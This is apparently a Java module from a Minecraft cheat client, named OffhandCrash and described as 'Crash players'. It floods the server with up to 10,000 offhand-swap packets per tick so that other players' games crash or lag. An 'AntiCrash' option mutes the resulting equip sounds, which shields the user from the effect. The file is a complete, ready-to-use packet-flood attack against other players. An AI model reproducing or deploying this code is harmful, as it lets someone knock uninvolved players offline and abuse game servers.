package badgamesinc.hypnotic.module.player;

import badgamesinc.hypnotic.event.EventTarget;
import badgamesinc.hypnotic.event.events.EventSound;
import badgamesinc.hypnotic.mixin.ClientConnectionAccessor;
import badgamesinc.hypnotic.module.Category;
import badgamesinc.hypnotic.module.Mod;
import badgamesinc.hypnotic.settings.settingtypes.BooleanSetting;
import badgamesinc.hypnotic.settings.settingtypes.NumberSetting;
import io.netty.channel.Channel;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.sound.SoundEvents;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Mod {

	public NumberSetting speed = new NumberSetting("Speed", 1000, 100, 10000, 100);
	public BooleanSetting crash = new BooleanSetting("Crash", true);
	public BooleanSetting antiCrash = new BooleanSetting("AntiCrash", true);
	
    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0) , Direction.UP);

    public OffhandCrash() {
        super("OffhandCrash", "Crash players", Category.PLAYER);
        addSettings(speed, crash, antiCrash);
    }

    @Override
    public void onTick() {
    	if (crash.isEnabled()) {
    		Channel channel = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).getChannel();
            for (int i = 0; i < speed.getValue(); i++) channel.write(PACKET);
            channel.flush();
    	}
        super.onTick();
    }
    
    @EventTarget
	public void onSound(EventSound event) {
    	if (antiCrash.isEnabled() && event.sound == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) event.setCancelled(true);
    }
}
